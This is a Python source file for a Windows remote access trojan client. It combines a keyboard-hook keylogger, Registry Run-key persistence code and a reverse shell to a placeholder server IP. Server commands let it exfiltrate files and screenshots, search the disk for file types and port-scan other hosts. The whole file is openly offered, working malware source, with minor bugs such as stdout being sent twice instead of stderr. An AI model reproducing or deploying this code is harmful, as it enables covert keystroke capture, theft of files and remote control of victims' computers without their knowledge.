# TCP Client
import socket       
import subprocess
import os
from tempfile import mkdtemp
from shutil import copy, rmtree
import winreg as wreg
from random import randrange
from PIL import ImageGrab
from time import sleep
from pythoncom import PumpMessages
from pyWinhook import HookManager

def keypressed(event):
    global store
    # Enter and backspace are not handled properly that's why we hardcode their values to < Enter > and <BACK SPACE>
    # note that we can know if the user input was enter or backspace based on their ASCII values
    keys = ''
    if event.Ascii==13:
        keys=' < Enter > ' 
    elif event.Ascii==8:
        keys=' <BACK SPACE> '
    else:
        keys=chr(event.Ascii)
    store += keys 
    
    fp=open("keylogs.txt","w")
    fp.write(store)
    fp.close()
    return True

# string where we will store all the pressed keys
store = ''
# create and register a hook manager and once the user hit any keyboard button, 
# keypressed func will be executed
obj = HookManager()
obj.KeyDown = keypressed
# start the hooking loop and pump out the messages
obj.HookKeyboard()
PumpMessages()

class Client:
    ''' Target Client '''
    def __init__(self):
        self.SERVER_IP = '<SERVER-IP-ADDRESS>'
        self.SERVER_PORT = 8080
        # Persistence I: copy script to random appdata location
        self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
        self.PATH = os.path.realpath(__file__)
        # copy(self.PATH, self.APPDATA_PATH)
        # Persistence II: registry key pointing to the copied file
        # self.addRegkey()

    def addRegkey(self):
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, self.APPDATA_PATH)
        key.Close()

    def scanner(self,s, ip, ports):
        scan_result = ''
        for port in ports.split(','): 
            # ports are separated by a comma in this format 21,22,..
            # make a connection using socket library for EACH one of these ports
            try:   
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # connect_ex returns 0 if the operation succeeded, and in our case operation succeeded means that 
                # the port is open otherwise the port could be closed or the host is unreachable in the first place.
                output = sock.connect_ex((ip, int(port) )) 
                
                if output == 0:
                    scan_result += f"[+] Port {port} is opened\n"
                else:
                    scan_result += f"[-] Port {port} is closed or Host is not reachable\n" 
                    
                sock.close()
        
            except Exception as e:
                pass
        # send results to server
        s.send(scan_result.encode()) 

    def transfer(self, s, path):
        ''' send transfer file '''
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while packet != b'':
                s.send(packet) 
                packet = f.read(1024)
            s.send(b'DONE')
            f.close()
        else: 
            # the file doesn't exist
            s.send(b'Unable to find out the file')

    def connect(self): 
        ''' connect to server '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((self.SERVER_IP, self.SERVER_PORT)) # Here we define the server IP and the listening port

        # keep receiving commands from server
        while True: 
            # read the first KB of the tcp socket
            command = s.recv(1024).decode()         
            if 'terminate' in command:
                # if we got terminate order from server, 
                # close the socket and break the loop
                s.close()
                break 
            elif 'cd' in command:
                cur_path = os.getcwd()
                com, directory = command.split()
                new_path = f"{cur_path}\\{directory}"
                try: 
                    os.chdir(new_path)
                    s.send(f"[*] Current Path: {new_path}".encode())
                except Exception as e:
                    s.send(str(e).encode()) 
            elif 'grab' in command: 
                # on grab, indicate for file transfer operation.
                path = command.split()[-1]
                try: 
                    self.transfer(s, path)
                except Exception as e:
                    s.send(str(e).encode())
            elif 'screenshoot' in command: 
                # on screenshoot, take screen image and send it to server 
                dirpath = mkdtemp()
                ImageGrab.grab().save(dirpath + "/screen.jpg", "JPEG")
                try: 
                    self.transfer(s, dirpath + "/screen.jpg")
                    rmtree(dirpath) 
                except Exception as e:
                    s.send(str(e).encode())
            elif 'search' in command: 
                # cut off 'search' keyward, output would be C:\\*.pdf
                command = command[7:] 
                # split command to path and ext
                path, ext = command.split('*') 
                file_list = '' 
                
                for dirpath, dirnames, files in os.walk(path):
                    for f in files:
                        if f.endswith(ext):
                            file_list = file_list + '\n' + os.path.join(dirpath, f)
                # Send search result to server
                s.send(file_list.encode())
            elif 'scan' in command: 
                # syntax: scan 10.0.2.15:22,80
                # cut off 'scan' keyward
                command = command[5:]
                ip, ports = command.split(':') 
                self.scanner(s, ip, ports)
            else: 
                # otherwise, we pass the received command to a shell process
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send(cmd.stdout.read()) # send back the result
                s.send(cmd.stdout.read()) # send back the error -if any-, such as syntax error

def main():
    c = Client()
    # Persistence III: if can't connect to server sleep for 1 - 10 seconds
    while True:
        try:
            if c.connect():
                break
        except:
            sleep_for = randrange(1, 10)
            sleep( sleep_for )

if __name__ == "__main__":
    main()